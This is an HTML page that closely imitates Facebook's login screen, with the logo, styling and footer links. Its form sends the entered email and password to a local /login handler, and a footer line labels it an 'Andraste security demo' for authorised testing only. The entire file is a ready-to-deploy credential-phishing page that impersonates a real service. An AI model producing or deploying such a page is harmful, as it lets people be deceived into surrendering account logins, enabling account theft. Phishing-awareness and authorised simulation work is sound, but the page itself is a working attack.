<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Facebook – log in or sign up</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.top-bar{width:100%;background:#fff;border-bottom:1px solid #dddfe2;padding:10px 16px;display:flex;align-items:center;gap:10px}
.fb-icon{width:40px;height:40px;flex-shrink:0}
.top-bar span{font-size:20px;font-weight:700;color:#1877F2}
.wrap{width:100%;max-width:400px;padding:24px 16px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px}
h2{font-size:20px;font-weight:600;color:#1c1e21;margin-bottom:4px}
.sub{font-size:14px;color:#606770;margin-bottom:18px}
input{display:block;width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none;transition:border .15s,box-shadow .15s;color:#1c1e21}
input:focus{border-color:#1877F2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
.btn-login{width:100%;padding:14px;background:#1877F2;color:#fff;border:0;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer;margin-bottom:16px}
.btn-login:active{background:#1056ba}
.sep{display:flex;align-items:center;gap:12px;color:#b0b3b8;font-size:13px;margin-bottom:16px}
.sep::before,.sep::after{content:'';flex:1;height:1px;background:#e4e6eb}
.btn-create{width:100%;padding:13px;background:#42b72a;color:#fff;border:0;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer}
.forgot{display:block;text-align:center;color:#1877F2;font-size:14px;text-decoration:none;margin-bottom:20px}
.foot{font-size:11px;color:#8a8d91;text-align:center;margin-top:20px;line-height:1.8}
.foot a{color:#385898;text-decoration:none;margin:0 3px}
</style>
</head>
<body>
  <!-- Facebook-style top bar -->
  <div class="top-bar">
    <svg class="fb-icon" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
      <rect width="40" height="40" rx="6" fill="#1877F2"/>
      <path fill="#fff" d="M27.5 20H23v-3c0-1.1.9-2 2-2h2.5v-4H23c-3.3 0-6 2.7-6 6v3h-3.5v4H17v10h5V24h3.5l.5-4z"/>
    </svg>
    <span>facebook</span>
  </div>

  <div class="wrap">
    <div class="card">
      <h2>Log in to Facebook</h2>
      <p class="sub">Enter your email and password</p>

      <form method="POST" action="/login">
        <input name="u" type="email" inputmode="email" autocomplete="email"
               placeholder="Email address or phone number" required autofocus>
        <input name="p" type="password" autocomplete="current-password"
               placeholder="Password" required>
        <button type="submit" class="btn-login">Log in</button>
      </form>

      <a class="forgot" href="#">Forgotten password?</a>
      <div class="sep">or</div>
      <button class="btn-create" type="button">Create new account</button>
    </div>

    <div class="foot">
      <a href="#">Privacy Policy</a>&middot;<a href="#">Terms &amp; Policies</a>&middot;<a href="#">Help Centre</a><br>
      Meta &copy; 2024 &nbsp;&middot;&nbsp; Andraste security demo &mdash; authorised testing only.
    </div>
  </div>
<!-- Andraste security demonstration — authorised testing only -->
</body>
</html>
